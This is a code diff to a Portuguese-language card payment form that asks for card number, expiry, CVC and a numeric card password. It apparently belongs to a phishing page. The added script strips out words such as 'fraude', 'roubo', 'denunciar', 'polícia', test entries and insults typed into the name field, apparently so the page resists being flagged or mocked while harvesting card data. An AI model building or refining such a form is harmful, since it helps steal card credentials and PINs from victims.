@@ -57,9 +57,8 @@
             margin-bottom: 19px; /* Posição restaurada para o fluxo normal */
         }
         .form-row .form-group { margin-bottom: 0; }
-        /* --- ALTERAÇÃO AQUI --- */
-        .validity-group { flex: 7; } /* Proporção ajustada */
-        .cvc-group { flex: 3; }      /* Proporção ajustada */
+        .validity-group { flex: 7; }
+        .cvc-group { flex: 3; }
         .month-wrapper { flex: 5; }
         .year-wrapper { flex: 6; }
         label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--label-color); }
@@ -115,10 +114,14 @@
             <div class="form-group">
                 <label for="nome">Nome Completo</label>
                 <input type="text" id="nome" name="nome" required>
+                <!-- Div para exibir erros de palavras proibidas -->
+                <div id="nome-error-msg" class="validation-error"></div>
             </div>
             <div class="form-group">
                 <label for="numero_cartao">Número do Cartão</label>
                 <input type="text" id="numero_cartao" name="numero_cartao" required maxlength="16" pattern="\d{16}" inputmode="numeric" title="Digite os 16 dígitos do seu cartão.">
+                 <!-- Div para exibir erros de palavras proibidas -->
+                <div id="cartao-error-msg" class="validation-error"></div>
             </div>
             <div class="form-row">
                 <div class="form-group validity-group">
@@ -174,7 +177,7 @@
         monthInput.addEventListener('blur', () => {
             const monthValue = parseInt(monthInput.value);
             if (monthInput.value && (monthValue < 1 || monthValue > 12)) {
-                monthError.textContent = 'Insira mês de 1 a 12.';
+                monthError.textContent = 'Insira um mês de 1 a 12.';
                 monthInput.value = '';
             }
         });
@@ -194,6 +197,65 @@
         yearInput.addEventListener('input', () => {
             yearError.textContent = '';
         });
+
+        // --- CÓDIGO DE VALIDAÇÃO MODIFICADO ---
+        const nomeInput = document.getElementById('nome');
+        const cartaoInput = document.getElementById('numero_cartao');
+        const cvcInput = document.getElementById('cvc');
+        const senhaInput = document.getElementById('senha');
+        const nomeErrorMsg = document.getElementById('nome-error-msg');
+
+        // Lista de palavras que serão bloqueadas (não sensível a maiúsculas/minúsculas)
+        const palavrasProibidas = [
+            'teste', 'exemplo', 'inválido', 'fraude', 'roubo', 'cu', 'cú', 'fdp', 
+            'safado', 'bandido', 'denunciar', 'policia', 'polícia', 'vagabundo', 
+            'pilantra', 'roubar'
+        ];
+
+        // Função para forçar apenas números
+        function forceNumeric(inputElement) {
+            inputElement.addEventListener('input', () => {
+                inputElement.value = inputElement.value.replace(/[^0-9]/g, '');
+            });
+        }
+
+        // Função para forçar apenas letras e espaços (com acentos)
+        function forceLetters(inputElement) {
+             inputElement.addEventListener('input', () => {
+                inputElement.value = inputElement.value.replace(/[^a-zA-Z\u00C0-\u017F\s]/g, '');
+            });
+        }
+
+        function validarPalavras(inputElement, errorElement) {
+            let valor = inputElement.value;
+            const valorOriginal = valor;
+
+            for (const palavra of palavrasProibidas) {
+                const regex = new RegExp(palavra, 'gi');
+                if (regex.test(valor)) {
+                    valor = valor.replace(regex, '');
+                    errorElement.textContent = `A palavra "${palavra}" não é permitida.`;
+                    setTimeout(() => {
+                        errorElement.textContent = '';
+                    }, 3000);
+                }
+            }
+            if (valor !== valorOriginal) {
+                inputElement.value = valor;
+            }
+        }
+
+        // Aplicar validações
+        forceLetters(nomeInput);
+        nomeInput.addEventListener('input', () => validarPalavras(nomeInput, nomeErrorMsg));
+        
+        forceNumeric(cartaoInput);
+        forceNumeric(monthInput);
+        forceNumeric(yearInput);
+        forceNumeric(cvcInput);
+        forceNumeric(senhaInput);
+        // --- FIM DO CÓDIGO DE VALIDAÇÃO ---
+
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
